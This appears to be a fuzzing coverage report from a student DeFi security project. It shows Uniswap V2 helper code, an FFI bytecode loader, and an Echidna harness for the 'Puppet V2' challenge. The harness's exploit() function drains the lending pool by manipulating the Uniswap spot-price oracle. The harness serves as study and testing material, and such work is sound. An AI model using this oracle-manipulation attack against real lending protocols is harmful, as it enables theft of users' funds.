+  87 |     |     {
+  88 |     |         require(path.length >= 2, "UniswapV2Library: INVALID_PATH");
+  89 |     |         amounts = new uint256[](path.length);
+  90 |     |         amounts[0] = amountIn;
+  91 |     |         for (uint256 i; i < path.length - 1; i++) {
+  92 |     |             (uint256 reserveIn, uint256 reserveOut) = getReserves(factory, path[i], path[i + 1]);
+  93 |     |             amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
+  94 |     |         }
+  95 |     |     }
+  96 |     | 
+  97 |     |     // performs chained getAmountIn calculations on any number of pairs
+  98 |     |     function getAmountsIn(address factory, uint256 amountOut, address[] memory path)
+  99 |     |         internal
+ 100 |     |         view
+ 101 |     |         returns (uint256[] memory amounts)
+ 102 |     |     {
+ 103 |     |         require(path.length >= 2, "UniswapV2Library: INVALID_PATH");
+ 104 |     |         amounts = new uint256[](path.length);
+ 105 |     |         amounts[amounts.length - 1] = amountOut;
+ 106 |     |         for (uint256 i = path.length - 1; i > 0; i--) {
+ 107 |     |             (uint256 reserveIn, uint256 reserveOut) = getReserves(factory, path[i - 1], path[i]);
+ 108 |     |             amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
+ 109 |     |         }
+ 110 |     |     }
+ 111 |     | }
+ 112 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/test/puppet-v2/echidna/DeployCodeHelper.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | pragma solidity ^0.8.25;
+  3 |     | 
+  4 |     | interface IHevm {
+  5 |     |     function ffi(string[] calldata) external returns (bytes memory);
+  6 |     |     function deal(address who, uint256 amount) external;
+  7 |     | }
+  8 |     | 
+  9 |     | contract DeployCodeHelper {
+ 10 | *   |     address constant HEVM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
+ 11 |     |     IHevm constant hevm = IHevm(HEVM_ADDRESS);
+ 12 |     | 
+ 13 | *   |     function _readArtifactBytecode(string memory artifactPath) internal returns (bytes memory) {
+ 14 | *   |         string[] memory command = new string[](3);
+ 15 | *   |         command[0] = "python3";
+ 16 | *   |         command[1] = "scripts/get_bytecode.py";
+ 17 | *   |         command[2] = artifactPath;
+ 18 |     | 
+ 19 | *   |         bytes memory hexString = hevm.ffi(command);
+ 20 | *   |         require(hexString.length > 0, "FFI failed to get bytecode");
+ 21 |     |         
+ 22 |     |         // Remove ALL whitespace characters
+ 23 | *   |         bytes memory cleaned = new bytes(hexString.length);
+ 24 | *   |         uint256 writePos = 0;
+ 25 |     |         
+ 26 | *   |         for (uint256 i = 0; i < hexString.length; i++) {
+ 27 | *   |             bytes1 char = hexString[i];
+ 28 | *   |             if (char != 0x20 && char != 0x09 && char != 0x0a && char != 0x0d) {
+ 29 | *   |                 cleaned[writePos] = char;
+ 30 | *   |                 writePos++;
+ 31 |     |             }
+ 32 |     |         }
+ 33 |     |         
+ 34 | *   |         bytes memory trimmed = new bytes(writePos);
+ 35 | *   |         for (uint256 i = 0; i < writePos; i++) {
+ 36 | *   |             trimmed[i] = cleaned[i];
+ 37 |     |         }
+ 38 |     |         
+ 39 | *   |         hexString = trimmed;
+ 40 | *   |         uint256 len = hexString.length;
+ 41 | *   |         require(len > 0, "Hex string is empty after cleaning");
+ 42 |     |         
+ 43 |     |         // Remove "0x" prefix
+ 44 | *   |         if (len >= 2 && hexString[0] == 0x30 && hexString[1] == 0x78) {
+ 45 |     |             bytes memory withoutPrefix = new bytes(len - 2);
+ 46 |     |             for (uint256 i = 0; i < len - 2; i++) {
+ 47 |     |                 withoutPrefix[i] = hexString[i + 2];
+ 48 |     |             }
+ 49 |     |             hexString = withoutPrefix;
+ 50 |     |             len = len - 2;
+ 51 |     |         }
+ 52 |     |         
+ 53 |     |         // Decode hex string to bytes
+ 54 | *   |         require(len % 2 == 0, "Invalid hex string length");
+ 55 |     |         require(len >= 2, "Hex string too short");
+ 56 |     |         bytes memory result = new bytes(len / 2);
+ 57 |     |         
+ 58 |     |         for (uint256 i = 0; i < len; i += 2) {
+ 59 |     |             uint8 high = _hexCharToByte(hexString[i]);
+ 60 |     |             uint8 low = _hexCharToByte(hexString[i + 1]);
+ 61 |     |             result[i / 2] = bytes1((high << 4) | low);
+ 62 |     |         }
+ 63 |     |         
+ 64 |     |         return result;
+ 65 |     |     }
+ 66 |     |     
+ 67 |     |     function _hexCharToByte(bytes1 char) internal pure returns (uint8) {
+ 68 |     |         uint8 c = uint8(char);
+ 69 |     |         if (c >= 48 && c <= 57) return c - 48;
+ 70 |     |         if (c >= 97 && c <= 102) return c - 87;
+ 71 |     |         if (c >= 65 && c <= 70) return c - 55;
+ 72 |     |         revert("Invalid hex character");
+ 73 |     |     }
+ 74 |     | 
+ 75 | *   |     function deployCode(string memory artifactPath, bytes memory constructorArgs) internal returns (address deployed) {
+ 76 | *   |         bytes memory bytecode = _readArtifactBytecode(artifactPath);
+ 77 |     |         require(bytecode.length > 0, "Bytecode is empty");
+ 78 |     |         
+ 79 |     |         bytes memory creationBytecode = abi.encodePacked(bytecode, constructorArgs);
+ 80 |     |         
+ 81 |     |         assembly {
+ 82 |     |             deployed := create(0, add(creationBytecode, 0x20), mload(creationBytecode))
+ 83 |     |         }
+ 84 |     |         require(deployed != address(0), "Contract deployment failed");
+ 85 |     |     }
+ 86 |     | }
+ 87 |     | 
+ 88 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/test/puppet-v2/echidna/PuppetV2EchidnaSolved.t.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | pragma solidity ^0.8.25;
+   3 |     | 
+   4 |     | import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+   5 |     | import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+   6 |     | import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+   7 |     | import {WETH} from "solmate/tokens/WETH.sol";
+   8 |     | import {ERC20Mint} from "src/exchange/ERC20Mint.sol";
+   9 |     | import {PuppetV2Pool} from "src/puppet-v2/PuppetV2Pool.sol";
+  10 |     | import {DeployCodeHelper} from "./DeployCodeHelper.sol";
+  11 |     | 
+  12 | *r  | contract PuppetV2EchidnaSolved is DeployCodeHelper {
+  13 |     | 
+  14 |     |     uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
+  15 | *   |     uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 10e18;
+  16 |     |     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
+  17 |     |     uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+  18 |     |     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+  19 |     | 
+  20 |     |     IUniswapV2Factory public uniswapFactory;
+  21 |     |     IUniswapV2Router02 public router;
+  22 |     |     WETH public weth;
+  23 |     |     ERC20Mint public token;
+  24 |     |     PuppetV2Pool public lendingPool;
+  25 |     |     IUniswapV2Pair public uniswapPair;
+  26 |     | 
+  27 |     |     address public constant attacker = address(0x30000);
+  28 |     |     address public constant recovery = address(0xdeadbeef);
+  29 |     |     
+  30 |     |     bool public initialized;
+  31 |     | 
+  32 |     |     constructor() payable {
+  33 |     |         // Minimal constructor - initialization happens in setup()
+  34 | *   |         initialized = false;
+  35 |     |     }
+  36 |     |     
+  37 |     |     // Public setup function - Echidna can call this to initialize
+  38 | *   |     function setup() public {
+  39 | *   |         if (initialized) return;
+  40 | *   |         require(address(this).balance >= UNISWAP_INITIAL_WETH_LIQUIDITY, "Insufficient ETH balance");
+  41 |     |         
+  42 |     |         // Deploy WETH first
+  43 | *   |         weth = new WETH();
+  44 |     | 
+  45 |     |         // Deploy Uniswap V2 Factory
+  46 |     |         uniswapFactory = IUniswapV2Factory(
+  47 | *   |             deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(this)))
+  48 |     |         );
+  49 |     |         
+  50 |     |         // Deploy Uniswap V2 Router
+  51 |     |         router = IUniswapV2Router02(
+  52 |     |             deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapFactory), address(weth)))
+  53 |     |         );
+  54 |     | 
+  55 |     |         // Deploy and mint token
+  56 |     |         token = new ERC20Mint("MyToken", "MTK");
+  57 |     |         token.mint(address(this), UNISWAP_INITIAL_TOKEN_LIQUIDITY);
+  58 |     |         token.mint(attacker, PLAYER_INITIAL_TOKEN_BALANCE);
+  59 |     |         token.mint(address(this), LENDING_POOL_INITIAL_TOKEN_BALANCE);
+  60 |     |         // Also mint tokens to this contract for the exploit function
+  61 |     |         token.mint(address(this), PLAYER_INITIAL_TOKEN_BALANCE);
+  62 |     | 
+  63 |     |         // Wrap ETH for liquidity
+  64 |     |         weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();
+  65 |     |         
+  66 |     |         // Add initial liquidity to Uniswap
+  67 |     |         token.approve(address(router), UNISWAP_INITIAL_TOKEN_LIQUIDITY);
+  68 |     |         weth.approve(address(router), UNISWAP_INITIAL_WETH_LIQUIDITY);
+  69 |     |         
+  70 |     |         router.addLiquidity({
+  71 |     |             tokenA: address(token),
+  72 |     |             tokenB: address(weth),
+  73 |     |             amountADesired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
+  74 |     |             amountBDesired: UNISWAP_INITIAL_WETH_LIQUIDITY,
+  75 |     |             amountAMin: 0,
+  76 |     |             amountBMin: 0,
+  77 |     |             to: address(this),
+  78 |     |             deadline: block.timestamp * 2
+  79 |     |         });
+  80 |     | 
+  81 |     |         // Get the pair address
+  82 |     |         uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(token), address(weth)));
+  83 |     |         require(address(uniswapPair) != address(0), "Pair not created");
+  84 |     | 
+  85 |     |         // Deploy lending pool
+  86 |     |         lendingPool = new PuppetV2Pool(
+  87 |     |             address(weth), 
+  88 |     |             address(token), 
+  89 |     |             address(uniswapPair), 
+  90 |     |             address(uniswapFactory)
+  91 |     |         );
+  92 |     |         
+  93 |     |         // Fund the lending pool
+  94 |     |         token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);
+  95 |     |         
+  96 |     |         initialized = true;
+  97 |     |     }
+  98 |     | 
+  99 |     |     // Echidna will call this repeatedly trying to make it return false
+ 100 |     |     function echidna_pool_not_drained() public returns (bool) {
+ 101 |     |         // Try to setup if not initialized
+ 102 |     |         if (!initialized) {
+ 103 |     |             try this.setup() {} catch {
+ 104 |     |                 return true; // Setup failed, return true (safe default)
+ 105 |     |             }
+ 106 |     |         }
+ 107 |     |         
+ 108 |     |         // If still not initialized, return true (safe default)
+ 109 |     |         if (!initialized || address(lendingPool) == address(0) || address(token) == address(0)) {
+ 110 |     |             return true;
+ 111 |     |         }
+ 112 |     |         
+ 113 |     |         // Pool should maintain its initial balance
+ 114 |     |         return token.balanceOf(address(lendingPool)) >= LENDING_POOL_INITIAL_TOKEN_BALANCE;
+ 115 |     |     }
+ 116 |     | 
+ 117 |     |     // Helper functions for Echidna to explore - similar to PuppetV3 pattern
+ 118 | *   |     function attemptSwap(uint256 amountIn) public {
+ 119 | *   |         if (!initialized) {
+ 120 | *   |             try this.setup() {} catch {
+ 121 | *   |                 return;
+ 122 |     |             }
+ 123 |     |         }
+ 124 |     |         if (amountIn == 0) return;
+ 125 |     |         if (address(token) == address(0) || address(router) == address(0)) return;
+ 126 |     |         if (amountIn > token.balanceOf(address(this))) return;
+ 127 |     | 
+ 128 |     |         token.approve(address(router), amountIn);
+ 129 |     |         address[] memory path = new address[](2);
+ 130 |     |         path[0] = address(token);
+ 131 |     |         path[1] = address(weth);
+ 132 |     |         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+ 133 |     |             amountIn,
+ 134 |     |             0,
+ 135 |     |             path,
+ 136 |     |             address(this),
+ 137 |     |             block.timestamp + 60
+ 138 |     |         );
+ 139 |     |     }
+ 140 |     | 
+ 141 |     |     function attemptBorrow(uint256 borrowAmount) public {
+ 142 |     |         if (!initialized) {
+ 143 |     |             try this.setup() {} catch {
+ 144 |     |                 return;
+ 145 |     |             }
+ 146 |     |         }
+ 147 |     |         if (borrowAmount == 0) return;
+ 148 |     |         if (address(lendingPool) == address(0) || address(token) == address(0)) return;
+ 149 |     |         if (borrowAmount > LENDING_POOL_INITIAL_TOKEN_BALANCE) return;
+ 150 |     |         if (token.balanceOf(address(lendingPool)) < borrowAmount) return;
+ 151 |     | 
+ 152 |     |         uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(borrowAmount);
+ 153 |     |         uint256 wethBalance = weth.balanceOf(address(this));
+ 154 |     |         
+ 155 |     |         // Deposit more WETH if needed
+ 156 |     |         if (wethRequired > wethBalance) {
+ 157 |     |             uint256 ethNeeded = wethRequired - wethBalance;
+ 158 |     |             if (address(this).balance >= ethNeeded) {
+ 159 |     |                 weth.deposit{value: ethNeeded}();
+ 160 |     |             } else {
+ 161 |     |                 return; // Not enough ETH
+ 162 |     |             }
+ 163 |     |         }
+ 164 |     |         
+ 165 |     |         weth.approve(address(lendingPool), wethRequired);
+ 166 |     |         lendingPool.borrow(borrowAmount);
+ 167 |     |         token.transfer(recovery, borrowAmount);
+ 168 |     |     }
+ 169 |     | 
+ 170 |     |     // Full exploit function - performs the complete attack
+ 171 |     |     // Echidna can call this to discover the vulnerability
+ 172 | *   |     function exploit() public {
+ 173 |     |         // Try to setup if not initialized
+ 174 | *   |         if (!initialized) {
+ 175 | *   |             try this.setup() {} catch {
+ 176 | *   |                 return; // Setup failed, can't proceed
+ 177 |     |             }
+ 178 |     |         }
+ 179 |     |         
+ 180 |     |         // Ensure contracts are initialized
+ 181 |     |         if (!initialized || address(token) == address(0) || address(router) == address(0) || address(lendingPool) == address(0)) {
+ 182 |     |             return;
+ 183 |     |         }
+ 184 |     |         
+ 185 |     |         // Check we have enough tokens (minted to this contract in setup)
+ 186 |     |         if (token.balanceOf(address(this)) < PLAYER_INITIAL_TOKEN_BALANCE) {
+ 187 |     |             return;
+ 188 |     |         }
+ 189 |     |         
+ 190 |     |         // Approve router to spend tokens
+ 191 |     |         token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
+ 192 |     | 
+ 193 |     |         // Swap tokens for WETH using fee-on-transfer supporting function
+ 194 |     |         address[] memory path = new address[](2);
+ 195 |     |         path[0] = address(token);
+ 196 |     |         path[1] = address(weth);
+ 197 |     | 
+ 198 |     |         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+ 199 |     |             PLAYER_INITIAL_TOKEN_BALANCE,
+ 200 |     |             0,
+ 201 |     |             path,
+ 202 |     |             address(this),
+ 203 |     |             block.timestamp + 60
+ 204 |     |         );
+ 205 |     | 
+ 206 |     |         // Wrap ETH to WETH
+ 207 |     |         weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+ 208 |     | 
+ 209 |     |         // Calculate required WETH to borrow all tokens from pool
+ 210 |     |         uint256 amountToBorrow = LENDING_POOL_INITIAL_TOKEN_BALANCE;
+ 211 |     |         uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(amountToBorrow);
+ 212 |     |         
+ 213 |     |         // Approve lending pool
+ 214 |     |         weth.approve(address(lendingPool), wethRequired);
+ 215 |     |         
+ 216 |     |         // Borrow all tokens from pool
+ 217 |     |         lendingPool.borrow(amountToBorrow);
+ 218 |     |         
+ 219 |     |         // Transfer tokens to recovery address
+ 220 |     |         token.transfer(recovery, amountToBorrow);
+ 221 |     |     }
+ 222 |     | 
+ 223 |     |     receive() external payable {}
+ 224 |     | }
+
